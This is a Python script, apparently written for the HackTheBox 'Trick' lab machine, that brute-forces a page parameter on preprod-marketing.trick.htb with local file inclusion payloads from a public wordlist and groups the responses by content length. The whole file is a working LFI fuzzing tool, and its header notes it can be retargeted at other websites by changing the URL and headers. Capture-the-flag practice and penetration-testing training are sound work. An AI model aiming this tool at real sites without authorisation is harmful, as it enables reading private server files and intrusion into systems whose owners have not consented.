#!/usr/bin/env python3
# This script is meant to be used for the HackTheBox Trick machine, although
# it *may* be used for other websites by changing the TARGET_URL and headers
# accordingly. Single-threaded but much faster than Burp Community Edition.
# The LFI payloads are obtained from Carlos Polop's LFI wordlist for Linux:
# https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

import json
import requests
from tqdm import tqdm


TARGET_URL = "http://preprod-marketing.trick.htb/index.php?page="
headers = {
	"Host": "preprod-marketing.trick.htb",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"DNT": "1",
	"Connection": "close",
	"Upgrade-Insecure-Requests": "1",
	"Sec-GPC": "1"
}
sesh = requests.session()
payload_wordlist = "./file_inclusion_linux.txt"
results_file = "./results.json"
results = {}


def main():
	with open (payload_wordlist, "r") as f:
		for p in tqdm(f.readlines()):
			payload = p.strip()  # strip away the '\n' newline character
			req = sesh.get(TARGET_URL + payload, headers=headers)
			content_length = str(len(req.content))

			if content_length not in results:
				results[content_length] = [payload]
			else:
				results[content_length].append(payload)

	with open(results_file, "w") as f:
		f.write(json.dumps(results, sort_keys=True, indent=2))
			

if __name__ == "__main__":
	print(f"[+] Brute-forcing with LFI payloads from {payload_wordlist}")
	main()
	print(f"[*] Content lengths (look at non-zero ones): {list(results.keys())}")
	print(f"[*] Results saved in {results_file}")
